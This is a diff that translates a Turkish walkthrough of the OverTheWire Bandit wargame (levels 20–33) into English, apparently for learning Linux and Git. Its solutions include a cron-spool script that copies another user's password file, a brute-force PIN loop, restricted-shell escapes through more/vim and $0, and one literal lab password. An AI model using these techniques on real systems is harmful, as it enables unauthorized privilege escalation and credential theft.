@@ -1,82 +1,82 @@
-# 🏴 OverTheWire: Bandit — Level 21'den Level 33'e Türkçe Rehber
+# 🏴 OverTheWire: Bandit — Level 21 to Level 33 Guide
 
-> Son bölüm! Cron job'lar, bash scripting, brute-force, kısıtlı ortamdan kaçış ve Git konularını kapsıyor.  
-> Bu bölümde artık sadece komut çalıştırmıyorsun — düşünüp script yazıyorsun.
+> Final section! Covers cron jobs, bash scripting, brute-force, escaping restricted environments, and Git.  
+> In this section you're not just running commands — you're thinking and writing scripts.
 
-**Önceki bölüm:** [bandit_11-20.md](./bandit_11-20.md) | **Referans:** [mayadevbe.me](https://mayadevbe.me/posts/overthewire/bandit/overview/)
+**Previous section:** [bandit_11-20.md](./bandit_11-20.md) | **Reference:** [mayadevbe.me](https://mayadevbe.me/posts/overthewire/bandit/overview/)
 
 ---
 
-## Level 20 → Level 21 — SUID Binary + Netcat + Arka Plan Süreci
+## Level 20 → Level 21 — SUID Binary + Netcat + Background Process
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit20@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-Home dizininde bir SUID binary var (`suconnect`). Belirttiğin porta bağlanıyor, bandit20'nin şifresini bekliyor; doğruysa bandit21'in şifresini gönderiyor. Bunun için hem bir netcat sunucusu hem de binary'yi aynı anda çalıştırman gerekiyor.
+### 🎯 Objective
+There's a SUID binary in the home directory (`suconnect`). It connects to the port you specify, waits for bandit20's password; if correct, it sends bandit21's password. You need to run both a netcat server and the binary at the same time.
 
-### 📖 Teori: Arka Plan Süreci (`&`)
+### 📖 Theory: Background Process (`&`)
 
-Normalde bir komut çalıştırınca terminal o komut bitene kadar bekler. `&` ile komutu **arka plana** gönderebilirsin — terminal serbest kalır, başka komut çalıştırabilirsin.
+Normally when you run a command, the terminal waits until it finishes. With `&`, you can send a command to the **background** — the terminal is freed up and you can run other commands.
 
 ```bash
-komut &       # arka planda çalıştır
-jobs          # arka plandaki süreçleri listele
-fg            # arka plan sürecini öne al
+command &     # run in background
+jobs          # list background processes
+fg            # bring background process to foreground
 ```
 
-`echo -n` → satır sonu karakteri (`\n`) eklemeden yazar. Netcat protokollerinde kritik — fazladan `\n` bazen bağlantıyı bozar.
+`echo -n` → writes without a newline character (`\n`). Critical in netcat protocols — an extra `\n` can sometimes break the connection.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
-# 1. Netcat sunucusunu arka planda başlat — şifreyi pipe ile gönder
+# 1. Start a netcat server in the background — pipe the password to it
 bandit20@bandit:~$ echo -n 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j' | nc -l -p 1234 &
 [1] 24661
 
-# 2. SUID binary'yi aynı porta yönlendir
+# 2. Point the SUID binary at the same port
 bandit20@bandit:~$ ./suconnect 1234
 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 Password matches, sending next password
-<sonraki level'ın şifresi>
+<next level's password>
 [1]+  Done
 ```
 
-> 💡 Port numarasını kendin seç — 1234 yerine başka bir şey de yazabilirsin. Sadece her iki komutta aynı olsun.
+> 💡 You choose the port number — you can use something other than 1234. Just make sure both commands use the same one.
 
 ---
 
-## Level 21 → Level 22 — Cron Job Okuma
+## Level 21 → Level 22 — Reading a Cron Job
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit21@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-Bir program düzenli aralıklarla otomatik çalışıyor. `/etc/cron.d/` içine bak, ne çalıştırıldığını bul.
+### 🎯 Objective
+A program is running automatically at regular intervals. Look inside `/etc/cron.d/` to find out what's being run.
 
-### 📖 Teori: Cron Job Nedir?
+### 📖 Theory: What is a Cron Job?
 
-**Cron**, Linux'ta belirli zaman aralıklarında otomatik komut/script çalıştıran zamanlayıcıdır. `/etc/cron.d/` gibi klasörlerdeki dosyalarda tanımlanır.
+**Cron** is Linux's scheduler that automatically runs commands/scripts at specified time intervals. Defined in files in directories like `/etc/cron.d/`.
 
-Cron satırının formatı:
+Cron line format:
 ```
-* * * * * kullanici /komut/yolu
+* * * * * user /command/path
 │ │ │ │ │
-│ │ │ │ └── Haftanın günü (0-7)
-│ │ │ └──── Ay (1-12)
-│ │ └────── Ayın günü (1-31)
-│ └──────── Saat (0-23)
-└────────── Dakika (0-59)
+│ │ │ │ └── Day of week (0-7)
+│ │ │ └──── Month (1-12)
+│ │ └────── Day of month (1-31)
+│ └──────── Hour (0-23)
+└────────── Minute (0-59)
 
-* * * * * → her dakika çalış
-@reboot   → sistem başlangıcında çalış
+* * * * * → run every minute
+@reboot   → run at system startup
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit21@bandit:~$ ls /etc/cron.d/
@@ -90,37 +90,37 @@ bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
 chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 
-# Script her dakika bandit22'nin şifresini o dosyaya yazıyor!
+# The script writes bandit22's password to that file every minute!
 bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-<şifre buraya gelir>
+<password goes here>
 ```
 
 ---
 
-## Level 22 → Level 23 — Bash Script Analizi ve md5sum
+## Level 22 → Level 23 — Bash Script Analysis and md5sum
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit22@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-Yine bir cron job var. Bu sefer script değişkenler ve `md5sum` kullanıyor — dosya adını kendin hesaplaman gerekiyor.
+### 🎯 Objective
+There's another cron job. This time the script uses variables and `md5sum` — you need to calculate the filename yourself.
 
-### 📖 Teori: Bash Değişkenleri ve md5sum
+### 📖 Theory: Bash Variables and md5sum
 
-Bash'te değişken tanımlama:
+Defining variables in Bash:
 ```bash
-isim="deger"                 # sabit değer
-isim=$(komut)                # komut çıktısını sakla
-echo $isim                   # değişkeni kullan
+name="value"                 # fixed value
+name=$(command)              # store command output
+echo $name                   # use the variable
 ```
 
-**`md5sum`:** Bir string veya dosyanın MD5 hash'ini üretir — sabit uzunlukta benzersiz bir parmak izi. Aynı giriş her zaman aynı çıktıyı verir.
+**`md5sum`:** Produces an MD5 hash of a string or file — a fixed-length unique fingerprint. The same input always gives the same output.
 
-**`cut -d ' ' -f 1`:** Boşlukla (`-d ' '`) ayırarak 1. alanı (`-f 1`) alır. `md5sum` çıktısı `hash  dosya` şeklinde gelir, biz sadece hash'i istiyoruz.
+**`cut -d ' ' -f 1`:** Splits by space (`-d ' '`) and takes field 1 (`-f 1`). `md5sum` output is `hash  file`, we only want the hash.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@@ -133,106 +133,106 @@ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 cat /etc/bandit_pass/$myname > /tmp/$mytarget
 ```
 
-Script bandit23 olarak çalışıyor. `$myname` = `bandit23`. Dosya adını biz de hesaplayabiliriz:
+The script runs as bandit23. `$myname` = `bandit23`. We can compute the filename ourselves:
 
 ```bash
 bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 8ca319486bfbbc3663ea0fbe81326349
 
 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
-<şifre buraya gelir>
+<password goes here>
 ```
 
 ---
 
-## Level 23 → Level 24 — Kendi Script'ini Yaz (Cron ile Çalıştır)
+## Level 23 → Level 24 — Write Your Own Script (Execute via Cron)
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit23@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-Cron job, `/var/spool/bandit24/` klasöründeki script'leri **bandit24 olarak** çalıştırıp siliyor — ama yalnızca sahibi `bandit23` olanları. Bunu kullanarak bandit24'ün şifresini çalan bir script yaz.
+### 🎯 Objective
+A cron job runs scripts in `/var/spool/bandit24/` **as bandit24** and then deletes them — but only those owned by `bandit23`. Use this to write a script that steals bandit24's password.
 
-### 📖 Teori: Bash Script Yazımı
+### 📖 Theory: Writing Bash Scripts
 
-Bir bash script'in ilk satırı **shebang** olmalı — hangi interpreter kullanılacağını söyler:
+The first line of a bash script must be the **shebang** — it tells which interpreter to use:
 ```bash
 #!/bin/bash
 ```
 
-Dosyayı çalıştırılabilir yapmak için:
+To make a file executable:
 ```bash
-chmod +x script.sh    # çalıştırma izni ver
-chmod +rx script.sh   # okuma + çalıştırma
-chmod 777 klasor      # herkese tam yetki (dikkatli kullan)
+chmod +x script.sh    # give execute permission
+chmod +rx script.sh   # read + execute
+chmod 777 folder      # full permissions to everyone (use carefully)
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
-# Geçici çalışma klasörü oluştur
+# Create a temporary working directory
 bandit23@bandit:~$ mktemp -d
 /tmp/tmp.ljEyl6kv1M
 bandit23@bandit:~$ cd /tmp/tmp.ljEyl6kv1M
 
-# Script'i yaz
+# Write the script
 bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ nano bandit24_pass.sh
 ```
 
-Script içeriği:
+Script contents:
 ```bash
 #!/bin/bash
 cat /etc/bandit_pass/bandit24 > /tmp/tmp.ljEyl6kv1M/password
 ```
 
 ```bash
-# İzinleri ayarla
+# Set permissions
 bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ chmod +rx bandit24_pass.sh
 bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ chmod 777 /tmp/tmp.ljEyl6kv1M
 bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ touch password
 bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ chmod 777 password
 
-# Script'i cron klasörüne kopyala
+# Copy the script to the cron directory
 bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ cp bandit24_pass.sh /var/spool/bandit24/
 
-# ~1 dakika bekle, sonra oku
+# Wait ~1 minute, then read
 bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ cat password
-<şifre buraya gelir>
+<password goes here>
 ```
 
-> ⚠️ Dosya boşsa: Script'in ve klasörün izinlerini kontrol et. Cron job script'i çalıştıramazsa dosyaya yazmaz.
+> ⚠️ If the file is empty: check the permissions on the script and folder. If the cron job can't run the script, it won't write to the file.
 
 ---
 
 ## Level 24 → Level 25 — Brute Force (Bash Script + Netcat)
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit24@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-Port 30002'deki daemon, bandit24'ün şifresini + 4 haneli PIN kodunu bekliyor. PIN'i bilmiyorsun; tüm 10.000 kombinasyonu dene.
+### 🎯 Objective
+The daemon on port 30002 expects bandit24's password + a 4-digit PIN code. You don't know the PIN; try all 10,000 combinations.
 
-### 📖 Teori: For Loop ve Brute Force
+### 📖 Theory: For Loop and Brute Force
 
-Bash'te for döngüsü:
+For loop in Bash:
 ```bash
 for i in {0000..9999}
 do
-    echo "değer: $i"
+    echo "value: $i"
 done
 ```
 
-`{0000..9999}` → 0000'dan 9999'a kadar, başındaki sıfırları koruyarak sayar.
+`{0000..9999}` → counts from 0000 to 9999, preserving leading zeros.
 
-`>>` operatörü dosyaya **ekleyerek** yazar (üzerine yazmaz).
+The `>>` operator **appends** to a file (doesn't overwrite).
 
-**Brute force:** Tüm olası kombinasyonları sistematik olarak deneme yöntemi. Gerçek dünyada güçlü şifreler ve rate limiting bunu engeller.
+**Brute force:** The method of systematically trying all possible combinations. In the real world, strong passwords and rate limiting prevent this.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit24@bandit:~$ mktemp -d
@@ -241,7 +241,7 @@ bandit24@bandit:~$ cd /tmp/tmp.3YQNHtW1Uu
 bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ nano brute.sh
 ```
 
-Script içeriği:
+Script contents:
 ```bash
 #!/bin/bash
 for i in {0000..9999}
@@ -255,50 +255,50 @@ cat possibilities.txt | nc localhost 30002 > result.txt
 bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ chmod +x brute.sh
 bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ ./brute.sh
 
-# "Wrong!" içermeyen satırları filtrele → doğru PIN satırı kalır
+# Filter out lines containing "Wrong!" → the correct PIN line remains
 bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ grep -v "Wrong" result.txt
 Correct!
-The password of user bandit25 is <şifre buraya gelir>
+The password of user bandit25 is <password goes here>
 ```
 
 ---
 
-## Level 25 → Level 26 — Kısıtlı Shell'den Kaçış (more + vim)
+## Level 25 → Level 26 — Escape from Restricted Shell (more + vim)
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit25@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-bandit26'nın shell'i `/bin/bash` değil — başka bir şey. Ne olduğunu bul ve ondan kaç.
+### 🎯 Objective
+bandit26's shell isn't `/bin/bash` — it's something else. Find out what it is and escape from it.
 
-### 📖 Teori: Kullanıcı Shell'i, more ve vim
+### 📖 Theory: User Shell, more, and vim
 
-Her kullanıcının varsayılan shell'i `/etc/passwd`'de yazılıdır:
+Every user's default shell is written in `/etc/passwd`:
 ```
 bandit26:x:11026:11026:...:/home/bandit26:/usr/bin/showtext
-                                                   ↑ bu bash değil!
+                                                   ↑ this isn't bash!
 ```
 
-**`more`:** Büyük dosyaları sayfa sayfa gösterir. Ama dosya küçükse (tüm içerik ekrana sığıyorsa) interaktif moda **girmez** — direkt çıkar. Terminal penceresini küçültürsen `more` interaktif moda girmek zorunda kalır.
+**`more`:** Shows large files page by page. But if the file is small (all content fits on screen), it does **not** enter interactive mode — it exits immediately. If you shrink the terminal window, `more` is forced into interactive mode.
 
-**`more` interaktif modunda `v`** → dosyayı `vim`'de açar.
+**In `more` interactive mode, press `v`** → opens the file in `vim`.
 
-**vim'den shell spawn etmek:**
+**Spawning a shell from vim:**
 ```
-:set shell=/bin/bash    → varsayılan shell'i bash yap
-:shell                  → o shell'i aç
+:set shell=/bin/bash    → set default shell to bash
+:shell                  → open that shell
 ```
-Ya da dosya okumak için:
+Or to read a file:
 ```
 :e /etc/bandit_pass/bandit26
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
-# bandit25 olarak: hangi shell kullanıyor?
+# As bandit25: which shell does bandit26 use?
 bandit25@bandit:~$ cat /etc/passwd | grep bandit26
 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
 
@@ -308,78 +308,78 @@ export TERM=linux
 more ~/text.txt
 exit 0
 
-# SSH key var, onu kullanarak bağlan
+# There's an SSH key, use it to connect
 bandit25@bandit:~$ ls
 bandit26.sshkey
 
-# Kendi makinene kopyala, izin ver
+# Copy to your own machine, set permissions
 $ chmod 600 bandit26.sshkey
 $ ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
 ```
 
-Bağlanınca `more` başlar ama terminal büyükse direkt kapanır. **Terminal penceresini çok küçük yap**, ardından tekrar bağlan. `more` interaktif modda kalacak:
+When you connect, `more` starts but if the terminal is large it immediately closes. **Make the terminal window very small**, then connect again. `more` will stay in interactive mode:
 
 ```
-# more interaktif modunda:
-v          → vim açılır
+# In more interactive mode:
+v          → vim opens
 
-# vim içinde:
+# Inside vim:
 :set shell=/bin/bash
 :shell
 
-# Artık bash shell'i var!
+# Now you have a bash shell!
 bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
-<şifre buraya gelir>
+<password goes here>
 ```
 
 ---
 
-## Level 26 → Level 27 — SUID Binary (Tekrar)
+## Level 26 → Level 27 — SUID Binary (Again)
 
-### 🔐 Bağlantı
-Önceki level'daki yöntemle bandit26 shell'ini elde et.
+### 🔐 Connection
+Use the method from the previous level to get a bandit26 shell.
 
-### 🎯 Görev
-Home dizinindeki `bandit27-do` binary'sini kullanarak bandit27'nin şifresini al.
+### 🎯 Objective
+Use the `bandit27-do` binary in the home directory to get bandit27's password.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
-# Level 26'dan elde ettiğin shell'de:
+# In the shell you obtained from Level 26:
 bandit26@bandit:~$ ls
 bandit27-do  text.txt
 
 bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
-<şifre buraya gelir>
+<password goes here>
 ```
 
-Level 19-20'deki SUID binary mantığının aynısı — binary bandit27 yetkileriyle çalışıyor.
+Same SUID binary logic as Levels 19-20 — the binary runs with bandit27 privileges.
 
 ---
 
 ## Level 27 → Level 28 — Git Clone
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit27@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-`ssh://bandit27-git@localhost/home/bandit27-git/repo` adresindeki Git reposunu klonla, şifreyi bul.
+### 🎯 Objective
+Clone the Git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo` and find the password.
 
-### 📖 Teori: Git Nedir?
+### 📖 Theory: What is Git?
 
-**Git**, kodun tarihçesini ve değişikliklerini takip eden dağıtık versiyon kontrol sistemidir. GitHub ve GitLab gibi platformlar Git üzerine kurulu.
+**Git** is a distributed version control system that tracks code history and changes. Platforms like GitHub and GitLab are built on top of Git.
 
-Temel komutlar:
-- `git clone <url>` → repoyu indir
-- `git log` → commit geçmişini göster
-- `git branch -a` → tüm branch'leri listele
-- `git checkout <branch>` → branch değiştir
+Basic commands:
+- `git clone <url>` → download the repository
+- `git log` → show commit history
+- `git branch -a` → list all branches
+- `git checkout <branch>` → switch branch
 
-`.git/` klasörü → tüm versiyon bilgisi burada saklanır.
+`.git/` directory → all version information is stored here.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit27@bandit:~$ mktemp -d
@@ -387,76 +387,76 @@ bandit27@bandit:~$ mktemp -d
 bandit27@bandit:~$ cd /tmp/tmp.pUEZdMrFfV
 
 bandit27@bandit:/tmp/tmp.pUEZdMrFfV$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
-# Şifre: bandit27'nin şifresi
+# Password: bandit27's password
 
 bandit27@bandit:/tmp/tmp.pUEZdMrFfV$ cd repo
 bandit27@bandit:/tmp/tmp.pUEZdMrFfV/repo$ cat README
-The password to the next level is: <şifre buraya gelir>
+The password to the next level is: <password goes here>
 ```
 
 ---
 
-## Level 28 → Level 29 — Git Geçmişi (git log + git show)
+## Level 28 → Level 29 — Git History (git log + git show)
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit28@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-Repo'daki README'de şifre `xxxxxxxxxx` ile gizlenmiş. Eski commit'lere bak.
+### 🎯 Objective
+The password in the repo's README is hidden with `xxxxxxxxxx`. Look at older commits.
 
-### 📖 Teori: git log ve git show
+### 📖 Theory: git log and git show
 
 ```bash
-git log              # commit geçmişini göster
-git show <commit_id> # o commit'te ne değişti?
+git log              # show commit history
+git show <commit_id> # what changed in that commit?
 ```
 
-> ⚠️ **Önemli ders:** Git geçmişi her şeyi saklar. Hassas veriyi (şifre, API key) commit'lesen, sonradan silsen bile geçmişte kalır!
+> ⚠️ **Important lesson:** Git history keeps everything. If you commit sensitive data (password, API key), even if you delete it later, it remains in history!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit28@bandit:/tmp/...$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
 bandit28@bandit:/tmp/.../repo$ cat README.md
-- password: xxxxxxxxxx   # gizlenmiş
+- password: xxxxxxxxxx   # hidden
 
 bandit28@bandit:/tmp/.../repo$ git log
-commit edd935d...   fix info leak    ← şüpheli!
+commit edd935d...   fix info leak    ← suspicious!
 commit c086d11...   add missing data
 commit de2ebe2...   initial commit
 
 bandit28@bandit:/tmp/.../repo$ git show edd935d60906b33f0619605abd1689808ccdd5ee
--  password: <eski şifre — sonraki level'ın şifresi>
+-  password: <old password — next level's password>
 +  password: xxxxxxxxxx
 ```
 
 ---
 
-## Level 29 → Level 30 — Git Branch'leri
+## Level 29 → Level 30 — Git Branches
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit29@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-README'de "no passwords in production!" yazıyor. Başka branch'lere bak.
+### 🎯 Objective
+README says "no passwords in production!" Look at other branches.
 
-### 📖 Teori: Git Branching
+### 📖 Theory: Git Branching
 
-Branch'ler paralel geliştirme hatlarıdır. Genellikle:
-- `master` / `main` → production (canlı) kodu
-- `dev` → geliştirme kodu
-- `feature/...` → yeni özellik
+Branches are parallel lines of development. Typically:
+- `master` / `main` → production (live) code
+- `dev` → development code
+- `feature/...` → new feature
 
 ```bash
-git branch -a          # tüm branch'leri listele (remote dahil)
-git checkout <branch>  # branch'e geç
+git branch -a          # list all branches (including remote)
+git checkout <branch>  # switch to branch
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit29@bandit:/tmp/.../repo$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
@@ -465,193 +465,193 @@ bandit29@bandit:/tmp/.../repo$ cat README.md
 
 bandit29@bandit:/tmp/.../repo$ git branch -a
 * master
-  remotes/origin/dev          ← ilginç!
+  remotes/origin/dev          ← interesting!
   remotes/origin/master
   remotes/origin/sploits-dev
 
 bandit29@bandit:/tmp/.../repo$ git checkout dev
 bandit29@bandit:/tmp/.../repo$ cat README.md
-- password: <şifre buraya gelir>   ✓
+- password: <password goes here>   ✓
 ```
 
 ---
 
 ## Level 30 → Level 31 — Git Tag
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit30@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-README boş. Ne log ne branch — başka ne olabilir?
+### 🎯 Objective
+README is empty. No log, no branches — what else could there be?
 
-### 📖 Teori: Git Tag
+### 📖 Theory: Git Tags
 
-**Tag**, repo tarihinde önemli noktaları işaretler (örn. `v1.0.0` release). Log'da ve branch'lerde görünmeyebilir.
+**Tags** mark important points in repo history (e.g., `v1.0.0` release). They may not appear in log or branches.
 
 ```bash
-git tag              # tag'leri listele
-git show <tag_adı>   # tag detayını göster
+git tag              # list tags
+git show <tag_name>  # show tag details
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit30@bandit:/tmp/.../repo$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
 bandit30@bandit:/tmp/.../repo$ cat README.md
 just an empty file... muahaha
 
-bandit30@bandit:/tmp/.../repo$ git log    # tek commit, bilgi yok
-bandit30@bandit:/tmp/.../repo$ git branch -a  # sadece master
+bandit30@bandit:/tmp/.../repo$ git log    # single commit, no info
+bandit30@bandit:/tmp/.../repo$ git branch -a  # only master
 
 bandit30@bandit:/tmp/.../repo$ git tag
-secret                  ← bu ne?
+secret                  ← what's this?
 
 bandit30@bandit:/tmp/.../repo$ git show secret
-<şifre buraya gelir>
+<password goes here>
 ```
 
 ---
 
 ## Level 31 → Level 32 — Git Push + .gitignore Bypass
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit31@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-README'de görev açık: `key.txt` dosyasını "May I come in?" içeriğiyle remote'a push et. Ama `.gitignore` tüm `.txt` dosyalarını engelliyor.
+### 🎯 Objective
+The README makes the task clear: push a file named `key.txt` with content "May I come in?" to remote. But `.gitignore` blocks all `.txt` files.
 
-### 📖 Teori: git add, commit, push ve .gitignore
+### 📖 Theory: git add, commit, push, and .gitignore
 
-**`.gitignore`:** Git'in takip etmemesi gereken dosyaları listeler. `*.txt` → tüm txt dosyaları yok sayılır.
+**`.gitignore`:** Lists files Git should not track. `*.txt` → all txt files are ignored.
 
-**`git add -f`:** `-f` (force) bayrağı `.gitignore`'u atlayarak dosyayı zorla ekler.
+**`git add -f`:** The `-f` (force) flag bypasses `.gitignore` and forcibly adds the file.
 
 ```bash
-git add -f dosya.txt         # gitignore'a rağmen ekle
-git commit -m "mesaj"        # değişiklikleri kaydet
-git push -u origin master    # remote'a gönder
+git add -f file.txt          # add despite gitignore
+git commit -m "message"      # save changes
+git push -u origin master    # send to remote
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 bandit31@bandit:/tmp/.../repo$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
 bandit31@bandit:/tmp/.../repo$ cat README.md
-# Dosya adı: key.txt, İçerik: 'May I come in?', Branch: master
+# Filename: key.txt, Content: 'May I come in?', Branch: master
 
 bandit31@bandit:/tmp/.../repo$ cat .gitignore
-*.txt    # tüm txt dosyaları engelli!
+*.txt    # all txt files blocked!
 
-# Dosyayı oluştur
+# Create the file
 bandit31@bandit:/tmp/.../repo$ echo 'May I come in?' > key.txt
 
-# Zorla ekle, commit'le, push'la
+# Force add, commit, push
 bandit31@bandit:/tmp/.../repo$ git add -f key.txt
 bandit31@bandit:/tmp/.../repo$ git commit -m "add key"
 bandit31@bandit:/tmp/.../repo$ git push -u origin master
 
 remote: Well done! Here is the password for the next level:
-remote: <şifre buraya gelir>
+remote: <password goes here>
 ```
 
 ---
 
-## Level 32 → Level 33 — Uppercase Shell'den Kaçış ($0)
+## Level 32 → Level 33 — Escape from Uppercase Shell ($0)
 
-### 🔐 Bağlantı
+### 🔐 Connection
 ```bash
 ssh bandit32@bandit.labs.overthewire.org -p 2220
 ```
 
-### 🎯 Görev
-Giriş yapınca garip bir shell karşılıyor: yazdığın her şey büyük harfe çevriliyor. Komutlar çalışmıyor. Kaç!
+### 🎯 Objective
+A strange shell greets you on login: everything you type is converted to uppercase. Commands don't work. Escape!
 
-### 📖 Teori: Linux Değişkenleri ve $0
+### 📖 Theory: Linux Variables and $0
 
-Linux'ta değişkenler büyük harfle yazılır:
+Linux variables are written in uppercase:
 ```bash
-$HOME   → home dizini
-$PATH   → komut arama yolları
-$SHELL  → mevcut shell
-$0      → çalışan script/shell'in adı (örn. /bin/bash)
+$HOME   → home directory
+$PATH   → command search paths
+$SHELL  → current shell
+$0      → name of the running script/shell (e.g. /bin/bash)
 ```
 
-Shell'de `$0` yazdığında mevcut shell'i tekrar başlatır — bu bir **shell escape** tekniğidir.
+Typing `$0` in a shell restarts the current shell — this is a **shell escape** technique.
 
-Uppercase shell her şeyi büyük harfe çeviriyor. `ls` → `LS: not found`. Ama `$0` değişken referansı — harf değil, sembol — büyük harfe çevrilmiyor!
+The uppercase shell converts everything to uppercase. `ls` → `LS: not found`. But `$0` is a variable reference — it's a symbol, not a letter — so it doesn't get converted to uppercase!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
 WELCOME TO THE UPPERCASE SHELL
 >> ls
 sh: 1: LS: not found
 
->> $0          # shell değişkeni → kaçış!
+>> $0          # shell variable → escape!
 $              # normal shell prompt!
 
 $ whoami
-bandit33       # SUID sayesinde bandit33 olarak çalışıyoruz
+bandit33       # running as bandit33 thanks to SUID
 
 $ cat /etc/bandit_pass/bandit33
-<şifre buraya gelir>
+<password goes here>
 
 $ cat README.txt
 Congratulations on solving the last level of this game!
 ```
 
-**Tebrikler — Bandit tamamlandı! 🎉**
+**Congratulations — Bandit complete! 🎉**
 
 ---
 
-## 📚 Öğrenilen Komutlar Özeti (Level 21-33)
+## 📚 Commands Summary (Level 21-33)
 
-| Komut | Ne yapar |
+| Command | What it does |
 |---|---|
-| `komut &` | Komutu arka planda çalıştırır |
-| `jobs` | Arka plan süreçlerini listeler |
-| `echo -n` | Satır sonu olmadan yazar |
-| `cat /etc/cron.d/` | Cron job tanımlarını gösterir |
-| `$(komut)` | Komut çıktısını değişkene atar |
-| `md5sum` | MD5 hash üretir |
-| `cut -d ' ' -f 1` | Alanlara göre metni keser |
-| `for i in {0000..9999}` | Bash for döngüsü |
-| `chmod +x` | Çalıştırma izni verir |
-| `grep -v "pattern"` | Pattern içermeyen satırları gösterir |
-| `cat /etc/passwd` | Kullanıcı ve shell bilgilerini gösterir |
-| `git clone <url>` | Repo'yu indirir |
-| `git log` | Commit geçmişini gösterir |
-| `git show <id/tag>` | Commit veya tag detayını gösterir |
-| `git branch -a` | Tüm branch'leri listeler |
-| `git checkout <branch>` | Branch değiştirir |
-| `git tag` | Tag'leri listeler |
-| `git add -f` | gitignore'ı atlayarak dosya ekler |
-| `git commit -m "msg"` | Değişiklikleri kaydeder |
-| `git push` | Remote'a gönderir |
-| `$0` | Mevcut shell'i yeniden başlatır |
-| `printenv` | Tüm environment değişkenlerini listeler |
+| `command &` | Runs command in the background |
+| `jobs` | Lists background processes |
+| `echo -n` | Writes without newline |
+| `cat /etc/cron.d/` | Shows cron job definitions |
+| `$(command)` | Assigns command output to variable |
+| `md5sum` | Generates MD5 hash |
+| `cut -d ' ' -f 1` | Cuts text by fields |
+| `for i in {0000..9999}` | Bash for loop |
+| `chmod +x` | Gives execute permission |
+| `grep -v "pattern"` | Shows lines not containing the pattern |
+| `cat /etc/passwd` | Shows user and shell information |
+| `git clone <url>` | Downloads the repository |
+| `git log` | Shows commit history |
+| `git show <id/tag>` | Shows commit or tag details |
+| `git branch -a` | Lists all branches |
+| `git checkout <branch>` | Changes branch |
+| `git tag` | Lists tags |
+| `git add -f` | Adds file bypassing gitignore |
+| `git commit -m "msg"` | Saves changes |
+| `git push` | Sends to remote |
+| `$0` | Restarts the current shell |
+| `printenv` | Lists all environment variables |
 
 ---
 
-## 🏁 Bandit Tamamlandı!
+## 🏁 Bandit Complete!
 
